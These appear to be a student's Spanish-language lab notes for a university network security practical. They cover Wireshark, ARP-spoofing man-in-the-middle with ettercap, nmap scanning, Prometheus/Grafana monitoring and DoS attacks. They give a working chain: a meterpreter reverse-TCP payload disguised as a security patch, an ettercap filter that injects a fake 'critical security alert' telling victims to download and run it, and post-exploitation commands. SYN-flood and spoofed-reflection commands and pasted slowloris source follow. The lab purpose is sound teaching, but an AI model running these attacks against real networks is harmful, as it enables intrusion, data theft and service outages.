Wireshark → menú Statistics → Conversations → IPv4 o TCP

Ahí vemos:

  - IP origen / destino

  - Puerto origen / destino

  - Nº de paquetes y bytes intercambiados

<br>

- Protocolos:

Reglas o formatos que permiten que los equipos se comuniquen (capas del modelo TCP/IP).
Ejemplo: ARP, IP, TCP, UDP, HTTP, DNS...

En Wireshark → menú Estadísticas → Jerarquía de Protocolos
Te mostrará una lista con todos los protocolos detectados y su porcentaje de tráfico.

| Tipo          | Qué es                                        | Cómo verlo en Wireshark           | Ejemplo                                |
| ------------- | --------------------------------------------- | --------------------------------- | -------------------------------------- |
| **Servicio**  | Aplicación o función de red que usa un puerto | Columna *Protocol* o *Info*       | HTTP, DNS, SSH                         |
| **Conexión**  | Comunicación IP↔IP con puertos                | *Statistics → Conversations*      | 10.11.48.202:52314 ↔ 172.217.17.68:443 |
| **Protocolo** | Conjunto de reglas de comunicación            | *Statistics → Protocol Hierarchy* | TCP, UDP, ICMP, ARP                    |


<br>
<br>

---


## 2-ATAQUES MAN IN THE MIDDLE

### **Apartado e) Mediante arpspoofing entre una máquina objetivo (víctima) y el router del laboratorio obtenga todas las URL HTTP visitadas por la víctima.**

Yo ataco y en mi pantalla veo lo que mi compañero ve en directo. Sus cambios como yo estoy en el medio, yo lo muestro en pantalla. Lo tenemos que ver simultaneamente. Tengo que ver como cambia mi pantalla mientras el hace cambios (no se ve la pantalla remota).

1. Vamos al fichero /etc/ettercap/etter.conf y modificamos los siguientes valores:
	
	a. ec_uid y ec_gid a 0.

	b. remote browser a “NOMBRE NAVEGADOR http://%host%url”.

	Nosotros usamos w3m o lynx, pero vale cualquier navegador de texto:
```bash
remote_browser = "w3m http://%host%url"
remote_browser = "lynx http://%host%url"
```

3. Después, usamos el siguiente comando:
```bash
ettercap -Tq -i ens33 -P remote_browser -M arp:remote /10.11.48.175// /10.11.48.1//
```


4. La víctima usará el navegador para buscar algo (usar el navegador puesto en el fichero del ettercap). Si todo va bien, deberíamos haber entrado en la misma página que la víctima. Si hace click en un enlace dentro de esa página, nosotros también deberíamos entrar. **Usar w3m en la defensa**.
```bash
w3m www.google.com
````

Si todo va bien, deberíamos haber entrado en la misma página que la víctima. Si hace click en un enlace dentro de esa página, nosotros también deberíamos entrar.

Nos redirige a la misma página que la víctima buscó y la vemos en nuestra pantalla. Pero no es un escritorio remoto, solo nos redirige a sus búsquedas pero no muestra su pantalla en tiempo real ni lo que está haciendo, pero si podemos ver las páginas a las que accede.

<br>
<br>

---

### **Apartado f) Instale metasploit. Haga un ejecutable que incluya un Reverse TCP meterpreter payload para plataformas linux. Inclúyalo en un filtro ettercap y aplique toda su sabiduría en ingeniería social para que una víctima u objetivo lo ejecute.**

Elimino splunk e instalo metasploit. No dejarlo activo por defecto. Arrancarlo solo cuando sea necesario.

Metasploit es un framework (conjunto de herramientas) para desarrollar, probar y ejecutar exploits y payloads contra sistemas. Es muy usado en seguridad informática para pruebas de penetración y análisis.

1- Instalación de metasploit:
```bash
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod 755 msfinstall
./msfinstall
```

  -  Para abrir Metasploit
```bash
msfconsole
```
  - O en modo silencioso (sin banner)
```bash
msfconsole -q
```

Para salir simplemente **exit** o **Ctrl+D**.


<br>

2- Payload:

  Exploit = La llave que abre la cerradura (vulnerabilidad)
	
  Payload = Lo que haces después de entrar (código que se ejecuta)
Un payload en Metasploit es la parte del exploit que se ejecuta en el sistema objetivo después de que una vulnerabilidad ha sido explotada con éxito.

Crear un ejecutable con un payload de Meterpreter Reverse TCP para Linux, integrarlo en un filtro de Ettercap y aplicar técnicas de ingeniería social para que la víctima lo ejecute.
Buscar los comandos en wireshark, o darle a las flechas hasta que aparezca el que queramos.

Tenemos que darle permisos al fichero que le mandamos a nuestro compañero.
Tenemos que mandar dichos permisos a través de un túnel o con un zip. Si no lo hacemos, no funciona.
Hay que usar meterpreter, que usa comandos distintos. Tenemos que saber que comandos tenemos que usar.


Una vez que sabemos que funciona metasploit, tenemos que hacer el filtro de ettercap (si encuentras un tag de este estilo, cambialo por eso otro -> tendremos que hacer esto en un html). Tenemos que usar ingenieria social. Tenemos que hacer que nuestro compañero entre en algo que trampa que le mandemos.

En cuanto al fichero, tiene que descargarse algo que funcione. No poner un dropbox ni drive ni nada de eso. NUBE  ni de coña!!!!!


**Ingeniería Social**:
Creamos una ventanita en la que la víctima tiene que entrar. Va abrir un html normal y luego hacemos que funcione el ettercap.

1-Primero tiene que funcionar metasploit.
2-Luego ya tenemos que usar ettercap.

<br>

**PASOS**:

1-Creamos payload:
```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.11.48.202 LPORT=4444 -f elf > parche_seguridad.elf
```

msfvenom es la herramienta de metaspolit que genera payloads.
- [p] indica el tipo de payload que se generará (en este caso un reverse tcp, lo que significa que el payload abrirá una conexión TCP inversa en el host especificado).

- [LHOST] indica el host donde se generará la conexion (ip del atacante).

- [LPORT] indica el puerto donde se generará (puerto que le metimos al metasploit).

- [-f] indica el formato de salida del payload (en este caso .elf).

- [> parche_seguridad.elf] esta parte redirige la salida del comando al archivo "parche_seguridad.elf".

<br>

2-Crear script auto_ejecutable:
```bash
echo '#!/bin/bash
echo "Instalando actualización de seguridad..."
chmod +x parche_seguridad.elf
./parche_seguridad.elf
echo "Instalación completada."' > ejecutar_parche.sh
```

Le damos permisos al script:
```bash
chmod +x ejecutar_parche.sh
```

Crea script que da permisos automáticamente.

<br>

3-Crear ZIP y ponerlo en Internet:

```bash
zip -j actualizacion_emergencia.zip parche_seguridad.elf ejecutar_parche.sh
```

Empaqueta todo en un ZIP y lo sube a mi servidor web. Para subirlo a Internet, lo hice con Apache (recomendado):
```bash
cp actualizacion_emergencia.zip /var/www/html/
```

Este enlace funcionará siempre, siempre que el servidor esté encencido, es decir, si Apache está iniciado funcionará.

Tenemos subido el zip a Internet ahora en este enlace:
```bash
http://10.11.48.202/actualizacion_emergencia.zip
```


4-Crear el filtro ettercap:

```bash
nano filtro_final.filter
```

```html:
if (ip.proto == TCP && tcp.dst == 80) {
    if (search(DATA.data, "Accept-Encoding")) {
        replace("Accept-Encoding", "Accept-Rubbish!");
    }
}

if (ip.proto == TCP && tcp.src == 80) {
    replace("</body>", "</body><div style='position:fixed;top:0;left:0;width:100%;background:red;color:white;padding:15px;text-align:center;z-index:9999;font-family:Arial;font-size:16px;border-bottom:3px solid white;'><h2>ALERTA DE SEGURIDAD CRITICA</h2><p><b>Actualizacion de emergencia requerida</b></p><a href='http://10.11.48.202/actualizacion_emergencia.zip' style='background:white;color:red;padding:10px 20px;text-decoration:none;font-weight:bold;border:2px solid white;display:inline-block;margin:10px;'>DESCARGAR PARCHE DE SEGURIDAD</a><p style='margin:5px;font-size:14px;'><b>Opcion 1:</b> Clic en el boton arriba</p><p style='margin:5px;font-size:14px;'><b>Opcion 2:</b> Ejecutar en terminal:<br><span style='background:black;padding:5px;font-family:monospace;'>wget http://10.11.48.202/actualizacion_emergencia.zip</span></p><p style='margin:5px;font-size:14px;'>Luego: <span style='background:black;padding:5px;font-family:monospace;'>unzip actualizacion_emergencia.zip && ./ejecutar_parche.sh</span></p></div>");

    replace("</BODY>", "</BODY><div style='position:fixed;top:0;left:0;width:100%;background:red;color:white;padding:15px;text-align:center;z-index:9999;font-family:Arial;font-size:16px;border-bottom:3px solid white;'><h2>ALERTA DE SEGURIDAD CRITICA</h2><p><b>Actualizacion de emergencia requerida</b></p><a href='http://10.11.48.202/actualizacion_emergencia.zip' style='background:white;color:red;padding:10px 20px;text-decoration:none;font-weight:bold;border:2px solid white;display:inline-block;margin:10px;'>DESCARGAR PARCHE DE SEGURIDAD</a><p style='margin:5px;font-size:14px;'><b>Opcion 1:</b> Clic en el boton arriba</p><p style='margin:5px;font-size:14px;'><b>Opcion 2:</b> Ejecutar en terminal:<br><span style='background:black;padding:5px;font-family:monospace;'>wget http://10.11.48.202/actualizacion_emergencia.zip</span></p><p style='margin:5px;font-size:14px;'>Luego: <span style='background:black;padding:5px;font-family:monospace;'>unzip actualizacion_emergencia.zip && ./ejecutar_parche.sh</span></p></div>");
}
```

Pone tu archivo en internet para que tu compañero lo pueda descargar. Además todo el tráfico que genere desde un navegador se le redirigirá a esta página.

Esta página usa Ingeniería Social, le sale a la víctima en cualquier página que entre y le indica que hay una actualización pendiente en su navegador y que debe descargarla. Se verá algo así:

```bash
ALERTA DE SEGURIDAD CRITICA
Actualizacion de emergencia requerida

[DESCARGAR PARCHE DE SEGURIDAD] ← Botón azul

Opcion 1: Clic en el boton arriba
Opcion 2: Ejecutar en terminal:
wget http://10.11.48.202/actualizacion_emergencia.zip

Luego: unzip actualizacion_emergencia.zip && ./ejecutar_parche.sh
```



<br>

5-Compilarlo:
```bash
etterfilter filtro_final.filter -o filtro_final.ef
```
Es unha herramienta de ettercap que procesa archivos de filtro (los archivos de filtro se procesan para aplicar reglas específicas a los datos o al tráfico que se está filtrando).

 [-o] -> especifica el nombre del archivo de salida que se generará

<br>

6- Activar Red: Permite que el tráfico pase a través de tu máquina (importante para el ataque Man-in-the-Middle).
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
```

Habilitamos la opcion de reenvios de paquetes IP. 

<br>

**ATAQUE**:
En una terminal:

7-Ejecutar Ettercap para esnifar la paquetería de la víctima:
```bash
ettercap -T -i ens33 -M arp:remote /10.11.48.175// /10.11.48.1// -F filtro_final.ef
```

[-F] carga el filtro compilado


En otra terminal:

8-Abrir metasploit:

- Si no usamos túnel:
```bash
msfconsole
use exploit/multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set LHOST 10.11.48.202 
set LPORT 4444
exploit
```


Si ahora la víctima ejecuta cualquier página con w3m le redirige a mi página. Tendrá que descargar el archivo que le pone ahí y ejecutarlo y mientras estamos con exploit en metasploit se nos abrirá meterpreter.
```bash
meterpreter>
```

Para descargar basta con clicar en el enlace o hacer:
```bash
wget http://10.11.48.202/actualizacion_emergencia.zip
```

Para ejecutarlo:
```bash
unzip actualizacion_emergencia.zip
./ejecutar_parche.sh
```
 
**!!Estamos dentro de la máquina del compañero!!**

Comando de metasploit:
```bash
sysinfo          # Información del sistema comprometido
getuid           # Ver qué usuario eres
ps               # Listar procesos en ejecución
pwd              # Ver directorio actual
ls               # Listar archivos
cd /ruta         # Cambiar directorio
cat archivo.txt  # Ver contenido de archivo
search -f *.txt  # Buscar archivos por patrón
upload /ruta/local/file.txt   # Subir archivo a la víctima
download file.txt /ruta/local # Descargar archivo de la víctima
shell            # Acceder a la terminal normal de la víctima
```

#### RESUMEN FÁCIL:

PAYLOAD LOCAL ←→ VÍCTIMA ←→ ETTERCAP ←→ METASPLOIT


<br>
<br>

---

### **Apartado g) Pruebe alguna herramienta y técnica de detección del sniffing (preferiblemente arpon).**

**Carlos dice que sea lo último que hagamos antes de acabar la práctica 2!!!!**



<br>
<br>

---

### **Apartado h) Pruebe distintas técnicas de host discovey, port scanning y OS fingerprinting sobre las máquinas del laboratorio de prácticas en IPv4. Realice alguna de las pruebas de port scanning sobre IPv6. ¿Coinciden los servicios prestados por un sistema con los de IPv4?.**

**NADA de IPv6**

De las que están activas cuales son sus MAC etc. Si ponemos toda la red, petamos el sistema!!!

Poner solo una red pequeña o solo al compañero y la puerta del enlace por ejemplo. Probar también todo el 48 (más riesgo).


- Host discovery: descubrir equipos en la red local

```bash
nmap -sL 10.11.48.0/23
nmap -sP 10.11.48.0/23
```

- [-sL]: NO escanea puertos y NO hace ping a los equipos. SOLO lista las IPs/hosts que serían escaneadas
- [-sP]: No escanea puertos, solo dice que equipos están activos. Es lo mismo que -sn


<br>

- Port scanning (escaneo de puertos)
  
Podemos hacer escaneo de puertos de todos los equipos de /48 o solo de mi compañero. Usaremos nmap para descubrir que puertos están abiertos.

En mi caso voy a probar solo con mi compañero:

```bash
nmap -sS 10.11.48.175
```

- [-sS]: escaneo SYN rápido y sigiloso

Salida:
```bash
root@ismael:~# nmap -sS 10.11.48.175
Starting Nmap 7.93 ( https://nmap.org ) at 2025-10-30 12:35 CET
Nmap scan report for 10.11.48.175
Host is up (0.00026s latency).
Not shown: 998 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
514/tcp open  shell
MAC Address: 00:50:56:97:29:8B (VMware)

Nmap done: 1 IP address (1 host up) scanned in 0.40 seconds
```

Aquí vemos que mi comapñero tiene los puertos 22 (ssh) y el 514 (tcp) abiertos.
<br>

Escaneo completo TCP:
```bash
nmap -sT -p- 10.11.48.175
```

La salida es igual que la anterior.

Con -p podemos especificar los puertos que queremos comprobar si están o no abiertos.

<br>

- OS fingerprinting (detección de Sistema Operativo)
```bash
nmap -O 10.11.48.175
```

Salida:
```bash
root@ismael:~# nmap -O 10.11.48.175
Starting Nmap 7.93 ( https://nmap.org ) at 2025-10-30 12:48 CET
Nmap scan report for 10.11.48.175
Host is up (0.00041s latency).
Not shown: 998 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
514/tcp open  shell
MAC Address: 00:50:56:97:29:8B (VMware)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.6
Network Distance: 1 hop

OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 2.13 seconds
```
Si la máquina está apagada o bloqueando ICMP esto no funciona.

Escaneo completo con OS detection:
```bash
nmap -A 10.11.48.175
```

<br>

#### RESUMEN FÁCIL:

- Host discovery: nmap -sL 10.11.48.1/23.
- Port scanning: nmap -sS IP COMPAÑERO.
- OS fingerprinting: nmap -O IP COMPAÑERO.

De IPv6 no hacemos nada. La respuesta a la pregunta de si coinciden los servicios de IPv4 e IPv6 es que normalmente sí, pero a veces no, dependiendo de como esté configurado el equipo.

<br>
<br>

---

### **Apartado i) Obtenga información “en tiempo real” sobre las conexiones de su máquina, así como del ancho de banda consumido en cada una de ellas.**


- Conexiones de la máquina:

Recordamos de la práctica anterior como ver conexiones antiguas (ss, netstat):

```bash
ss -tulpn
netstat -putona
```

Para ver en tiempo real usamos **watch**:
```bash
watch -n 2 "ss -tulnp"
watch -n 2 "netstat -putona"
```

- [-n 2] indica que se actualiza cada 2 segundos.

<br>

- Ancho de banda en tiempo real:

1-Iftop (visual, por IP)

Es como un "monitor de tráfico en tiempo real" para tu conexión de internet o red. Muestra qué programas o conexiones 
están usando más ancho de banda en ese momento.

Instalamos iftop 
```bash
apt install iftop
```

Par ver el tráfico de red por conexión en una interfaz específica:
```bash
iftop -i ens33
```

<img width="1585" height="813" alt="imagen" src="https://github.com/user-attachments/assets/81c5cca6-4d28-44c6-871e-8a1a3e8fef16" />

Es un resumen de tráfico de red por conexiones/hosts. Cada fila muestra quién habla con quién (=> enviar, <= recibir) y cuánta información se ha transferido y las tasas de transferencia.

Parte inferior:

- TX: tráfico transmitido (enviado) por tu máquina.
  - cum: acumulado total enviado (ej. 15,0KB).
  - peak: pico de transferencia observado (ej. 8,59Kb).
  - A la derecha aparecen las tasas recientes (ej. 5,23Kb 2,36Kb 3,33Kb) — instantánea / medias.

- RX: tráfico recibido (lo mismo pero entrante).

TOTAL: suma TX + RX (volumen y picos combinados).

A la derecha de RX/TX hay columnas pequeñas con valores (320b 426b 539b) que son contadores por segundos o por muestreo (paquetes/bytes en ventanas pequeñas).

<br>


2-Nethogs (por proceso):

Es una herramienta que te dice qué procesos están usando la red y cuánto están enviando y recibiendo.

Instalarlo:
```bash
apt install nethogs
```

Para ver el tráfico por proceso:
```bash
nethogs ens33
```

<img width="1584" height="167" alt="imagen" src="https://github.com/user-attachments/assets/ef649fc2-05ed-444e-a93d-494723edc922" />

NetHogs muestra qué procesos están usando la red. Aquí solo hay uno: tu sesión SSH.

- sshd (tu conexión SSH) está enviando ~0.46 KB/s y recibiendo ~0.07 KB/s.

- El otro proceso no está usando red.

En total, la máquina está usando muy poco tráfico.

#### RESUMEN FÁCIL

- Conexiones en tiempo real:

watch -n 2 "ss -tulnp"

watch -n 2 "netstat -putona"

- Ancho de banda de las conexiones:

iftop -i ens33    # Por Ip en una interfaz específica.

nethogs ens33     # Por proceso

Hay más opciones como vnstat, tcptrack o tshark.


<br>
<br>

---

### **Apartado j) Monitorizamos nuestra infraestructura.:**

**- Instale prometheus y node_exporter y configúrelos para recopilar todo tipo de métricas de su máquina linux.**
  
**- Posteriormente instale grafana y agregue como fuente de datos las métricas de su equipo de prometheus.**

**- Importe vía grafana el dashboard 1860.**

**- En los ataques de los apartados m y n busque posibles alteraciones en las métricas visualizadas.**


> IMPORTANTE: tener la hora bien puesta, si la tenemos mal no funciona ya que hace calculos a tiempo real

> Poñer también en la configuracion de prometheus.yml el servidor do compañeiro (un target con su ip) 

En Prometeheus deberemos ver los datos de la máquina en tiempo real no en estático. La gráfica debe crecer hacia la izquierda y con picos altos cuanfo se realizan ataques como DoS debido a que hay mucho tráfico.

<br>

**- Instale prometheus y node_exporter y configúrelos para recopilar todo tipo de métricas de su máquina linux.**

**Prometheus** es un sistema de monitorización y base de datos de series temporales. Recoge métricas de diferentes servicios, las almacena y permite consultarlas. Necesitamos un sistema centralizado que almacene todas las métricas de nuestra máquina para poder analizarlas y visualizarlas luego en Grafana.

Instalar Prometheus:
```bash
apt install prometeheus
```

Prometheus ya viene con servicio configurado. Vamos a desactivar el activado automático y vamos a habilitarlo SOLO cuando lo queramos usar.
```bash
systemctl stop prometheus
systemctl disable prometheus
```

**Para activar prometheus** (para paralo hacer un stop):
```bash
systemctl enable prometheus
systemctl start prometehus
```

Para abrir la interfaz web:  **http://10.11.48.202:9090**

<br>

**Node-exporter** es un “exportador” de métricas del sistema Linux. Envía métricas de CPU, RAM, disco, red y más a Prometheus. Prometheus por sí solo no sabe nada de tu sistema. Node Exporter “expone” esas métricas para que Prometheus las pueda recopilar.

Instalar node exporter:
```bash
wget https://github.com/prometheus/node_exporter/releases/download/v1.10.2/node_exporter-1.10.2.linux-amd64.tar.gz
tar -xvzf node_exporter-1.10.2.linux-amd64.tar.gz
cd node_exporter-1.10.2.linux-amd64
./node_exporter
```

```bash
cd node_exporter-1.10.2.linux-amd64
mv node_exporter /usr/local/bin/  # Mover el binario a /usr/local/bin
chmod +x /usr/local/bin/node_exporter
```

Ahora estará disponible en: http://10.11.48.202:9100/metrics


Para activarlo, ./node_exporter. Para ver si funciona, lo mismo que para el prometheus pero con el puerto 9100. Tenemos que abrir dos terminales para que el node_exporter se conecte con el prometheus. Una vez instalado node_exporter, procedemos a configurar prometheus para pasarle sus métricas.

Tenemos que añadir esto en el fichero prometheus.yml-
```bash
nano /etc/prometheus/prometheus.yml
```

```bash
scrape_configs:
  - job_name: "node"
    static_configs:
      - targets: ["localhost:9100"]  # dirección de Node Exporter
```

En mi caso ya estaba configurado así.

Ahora vamos a desactivar el inicio automático del servicio de node-exporter y vamos a activarlo SOLO cuando nos haga falta:
```bash
systemctl stop prometheus-node-exporter
systemctl disable prometheus-node-exporter
systemctl enable prometheus-node-exporter
```

**Para activar node-exporter** (para paralo hacer un stop):
```bash
systemctl start prometheus-node-exporter
```


Ahora ambos están corriendo:
```bash
root@ismael:~/node_exporter-1.10.2.linux-amd64# netstat -tulpn | grep 9100
tcp6       0      0 :::9100                 :::*                    LISTEN      62880/prometheus-no
root@ismael:~/node_exporter-1.10.2.linux-amd64# netstat -tulpn | grep 9090
tcp6       0      0 :::9090                 :::*                    LISTEN      63105/prometheus
```

Podemos ver las métricas en Prometheus:

1-http://10.20.48.202:9090

2-Ve a “Targets” → ahí verás ambos jobs (prometheus y node) con estado UP.

3-Puedes ir a “Graph”, escribir métricas como node_cpu_seconds_total o node_memory_MemAvailable_bytes y verlas en tiempo real.

Métricas en Node-exporter:

1- Abre en el navegador o con curl: http://10.20.48.202:9100/metrics.

Verás todas las métricas del sistema en texto plano.

Al activar prometheus y node_exporter, nos metemos en la página del prometheus y
si todo va bien, nos debería salir esto en la pestaña Status > Targets:

<br>

Vamos a hacer que los servicios solo estén activos cuando nosotros los activemos. Par ello:

<img width="950" height="567" alt="imagen" src="https://github.com/user-attachments/assets/dc39ed4c-8587-4bb4-af55-7d4694c57d15" />

<br>

**- Posteriormente instale grafana y agregue como fuente de datos las métricas de su equipo de prometheus.**

Grafana es una herramienta de visualización y dashboards open source.

Resumen:
```text
Node Exporter → Prometheus → Grafana
     ↓              ↓           ↓
Métricas del   Almacena    Muestra gráficos
sistema Linux  los datos   y dashboards bonitos
```

Instalamos Grafana:
```bash
# Instalar dependencias
sudo apt install -y adduser libfontconfig1 musl

# Descargar versión OSS (gratuita)
wget https://dl.grafana.com/oss/release/grafana_10.2.2_amd64.deb

# Instalar
sudo dpkg -i grafana_10.2.2_amd64.deb

# Si hay errores de dependencias:
sudo apt-get install -f
```

Iniciar grafana:
```
/bin/systemctl start grafana-server
systemctl start grafana-server
```

Grafana corre en el puerto 3000. Podemos acceder a él en: **http://10.11.48.202:3000**

Por defecto el usuario es admin y la contraseña también. Nos pide actualizarla. Yo he puesto la misma que la del user lsi.

<br>

Vamos a añadir ahora Prometehus en Grafana:

- Pinchamos en la ruedita (en el logo del grafana).

- Le damos a “Data Sources” y luego a “Add data source”.

- Le damos a Prometheus.

- Un poco más abajo, en el campo de la URL, metemos la URL anterior del prometheus.

- Abajo de todo, guardamos los cambios pulsando en “Save & test”.

<br>

**- Importe vía grafana el dashboard 1860.**

1- Buscamos Grafana Labs: https://grafana.com/grafana/dashboards/

2- En la página verás un cuadro de búsqueda que dice algo como: "Search dashboards..."
Ahí buscamos 1860.

3- Copiamos el ID de la última actualización: 10242

4- En nuestra página de Grafana: Dashboards > New > Import. Pegamos el ID y guardamos el dashboard.

Ya estaría, debemos ver algo así:

<img width="1911" height="801" alt="imagen" src="https://github.com/user-attachments/assets/25b06500-c1e6-4be5-85d4-7a3ab21129e8" />

<br>

**- En los ataques de los apartados m y n busque posibles alteraciones en las métricas visualizadas.**

Más adelante comentaremos este apartado el los respectivos ejercicios.

<br>

#### RESUMEN FÁCIL

```text
TU MÁQUINA LINUX
     ↓
Node Exporter (puerto 9100)
     ↓  Exporta métricas del sistema
Prometheus (puerto 9090) 
     ↓  Recoge y almacena métricas
Grafana (puerto 3000)
     ↓  Muestra dashboards visuales
TÚ 👀 ← Ve gráficos bonitos en el navegador
```


Iniciarlos cuando los queramos usar:
```bash
systemctl start prometheus
systemctl start prometheus-node-exporter
systemctl start grafana-server
```

Pararlos:
```bash
systemctl stop prometheus
systemctl stop prometheus-node-exporter
systemctl stop grafana-server
```

<br>
<br>
---

### **Apartado k) PARA PLANTEAR DE FORMA TEÓRICA.: ¿Cómo podría hacer un DoS de tipo direct attack contra un equipo de la red de prácticas? ¿Y mediante un DoS de tipo reflective flooding attack?.**

**Carlos no lo mira mucho, solo Nino**

1-Direct attack: El ataque directo DoS consiste en envíar paquetes DIRECTAMENTE desde tu máquina a la víctima para hacer que servicios dejen de funcionar, consumirle recursos etc. Envío masivo de paquetes de manera directa a la víctima (la
dirección origen es normalmente falsificada). En el DDos de tipo direct attack se hace atacando al puerto ssh, 22. Si se encuentra conectado, se atacara a todos los puertos que tenga abiertos.

Para direct attack:
```bash
packit -c 0 -b 0 -s IP origen -d IP destino -F S -S 1000 -D 22
```
Basicamente hace esto. Envía paquetes falsos SIN PARAR desde IP_origen a IP_destino al puerto SSH (22).
Explicación del comando

    -c 0 = Cantidad: 0 = infinitos (no para nunca)

    -b 0 = Tamaño: automático

    -s IP_origen = IP del atacante (normalmente falsa)

    -d IP_destino = IP de la víctima (a quien atacas)

    -F S = Flag SYN (como tocar timbre pero no entrar)

    -S 1000 = Puerto origen 1000 (cualquiera)

    -D 22 = Puerto destino 22 (SSH - servicio importante)

2- Reflective flooding attack: en el ataque de tipo reflective flooding compromete un tercer equipo(routers, servidores DNS, amplificadores...) que ataque a la víctima. Envías paquetes a toda a red para que solo un equipo conteste e se sature.Es como pedirle a 100 personas que llamen por ti a alguien. El atacante envía peticiones a servidores legítimos (DNS, NTP, routers) pero falsifica la IP de origen para que sea la de la víctima. Los servidores responden masivamente a la víctima, saturándola sin que el atacante sea directamente visible. Se utilizan nodos intermedios como amplificadores (routers, servidores web, DNS …). El atacante envía paquetes que requieren respuesta a los amplificadores con ip origen la ip de la víctima ( los amplificadores responderán masivamente a la víctima).

Para refelective flooding attack:
```bash
dig @8.8.8.8 google.com +source=IP_victima
```

<br>
<br>

---

### **Apartado l) Ataque un servidor apache instalado en algunas de las máquinas del laboratorio de prácticas para tratar de provocarle una DoS. Utilice herramientas DoS que trabajen a nivel de aplicación (capa 7). ¿Cómo podría proteger dicho servicio ante este tipo de ataque? ¿Y si se produjese desde fuera de su segmento de red? ¿Cómo podría tratar de saltarse dicha protección?**

Instalar Apache. El atacante tiene que hacer un ataque DoS en capa 7 al servidor Apache. Ataques Apache recomendados: perl y python en GitHub (SlowLoris). Comprobar si el servdior sigue disponible. Parar el ataque. Configurar ModSecurity para defender estos ataques. Existen 5 paquetes de Apache que protegen sin querer. Probar varios y probar que podemos atacar y que podemos defendernos.

<br>

Instalamos Apache y solo lo activaremos cuando sea necesario:
```bash
apt install apache2
```


```bash
# Verificar que Apache se instaló correctamente
systemctl status apache2

# Pararlo y desactivarlo
systemctl stop apache2
systemctl disable apache2

# Verificar que responde
curl http://localhost
```

Activarlo solo cuando lo vayamos a usar (luego parar):
```bash
systemctl start apache2
systemctl stop apache2
```
Si todo va bien podemos ver la plantilla de apache2 aquí: **http://10.11.48.202/**

<br>

**ATAQUES**:

4 tipos de ataques:

1. SLOW HEADERS (SLOWLORIS)

    Mecanismo: Enviar cabeceras HTTP incompletas (sin CRLF final)

    Efecto: Servidor mantiene conexiones abiertas esperando finalización

    Objetivo: Consumir MaxClients de Apache

2. SLOW POST (R-U-DEAD-YET)

    Mecanismo: Peticiones POST con Content-Length grande + envío lento de cuerpo

    Efecto: Servidor espera eternamente los bytes pendientes

    Objetivo: Ocupar conexiones con transferencias incompletas


3. RANGE-BASED (APACHE KILLER)

    Mecanismo: Múltiples rangos de bytes superpuestos en cabecera Range

    Efecto: Agotar memoria y CPU procesando rangos duplicados

    Objetivo: Consumir recursos del servidor con peticiones complejas

4. SLOW READ

    Mecanismo: Peticiones legítimas + lectura lenta de respuesta (ACK delay)

    Efecto: Buffer TCP pequeño + retardos en confirmaciones

    Objetivo: Mantener conexiones ocupadas por máximo tiempo


Para probar un ataque y comprobar que se ha tiraod el apache hacer:
```bash
curl -I http://IP_VICTIMA/
```

Si el curl falla (queda parado), !funciona!. Cuando se para el ataque vuelve a funcionar el curl.


<br>

1-SlowHeaders (SlowLoris):

Consiste en enviar cabeceras http incompletas (sin el CRLF final que indica el final del header) de tal forma que el servidor no considera las sesiones estbalecidas pr completo y las deja abiertas, afectando al número de conexiones máximas configuradas.

<img width="654" height="114" alt="imagen" src="https://github.com/user-attachments/assets/dce91e6c-31c3-4f91-b35a-26bd1f5562fa" />


Copiar el código de un repositorio: **https://github.com/GHubgenius/slowloris.pl/blob/master/slowloris.pl**
```bash
nano slowloris.pl
```

Pegar código (tipo GET):
```bash
#!/usr/bin/perl -w
use strict;
use IO::Socket::INET;
use IO::Socket::SSL;
use Getopt::Long;
use Config;

$SIG{'PIPE'} = 'IGNORE';    #Ignore broken pipe errors

print <<EOTEXT;
Welcome to Slowloris - the low bandwidth, yet greedy and poisonous HTTP client by Laera Loris
EOTEXT

my ( $host, $port, $sendhost, $shost, $test, $version, $timeout, $connections );
my ( $cache, $httpready, $method, $ssl, $rand, $tcpto );
my $result = GetOptions(
    'shost=s'   => \$shost,
    'dns=s'     => \$host,
    'httpready' => \$httpready,
    'num=i'     => \$connections,
    'cache'     => \$cache,
    'port=i'    => \$port,
    'https'     => \$ssl,
    'tcpto=i'   => \$tcpto,
    'test'      => \$test,
    'timeout=i' => \$timeout,
    'version'   => \$version,
);

if ($version) {
    print "Version 0.7\n";
    exit;
}

unless ($host) {
    print "Usage:\n\n\tperl $0 -dns [www.example.com] -options\n";
    print "\n\tType 'perldoc $0' for help with options.\n\n";
    exit;
}

unless ($port) {
    $port = 80;
    print "Defaulting to port 80.\n";
}

unless ($tcpto) {
    $tcpto = 5;
    print "Defaulting to a 5 second tcp connection timeout.\n";
}

unless ($test) {
    unless ($timeout) {
        $timeout = 100;
        print "Defaulting to a 100 second re-try timeout.\n";
    }
    unless ($connections) {
        $connections = 1000;
        print "Defaulting to 1000 connections.\n";
    }
}

my $usemultithreading = 0;
if ( $Config{usethreads} ) {
    print "Multithreading enabled.\n";
    $usemultithreading = 1;
    use threads;
    use threads::shared;
}
else {
    print "No multithreading capabilites found!\n";
    print "Slowloris will be slower than normal as a result.\n";
}

my $packetcount : shared     = 0;
my $failed : shared          = 0;
my $connectioncount : shared = 0;

srand() if ($cache);

if ($shost) {
    $sendhost = $shost;
}
else {
    $sendhost = $host;
}
if ($httpready) {
    $method = "POST";
}
else {
    $method = "GET";
}

if ($test) {
    my @times = ( "2", "30", "90", "240", "500" );
    my $totaltime = 0;
    foreach (@times) {
        $totaltime = $totaltime + $_;
    }
    $totaltime = $totaltime / 60;
    print "This test could take up to $totaltime minutes.\n";

    my $delay   = 0;
    my $working = 0;
    my $sock;

    if ($ssl) {
        if (
            $sock = new IO::Socket::SSL(
                PeerAddr => "$host",
                PeerPort => "$port",
                Timeout  => "$tcpto",
                Proto    => "tcp",
            )
          )
        {
            $working = 1;
        }
    }
    else {
        if (
            $sock = new IO::Socket::INET(
                PeerAddr => "$host",
                PeerPort => "$port",
                Timeout  => "$tcpto",
                Proto    => "tcp",
            )
          )
        {
            $working = 1;
        }
    }
    if ($working) {
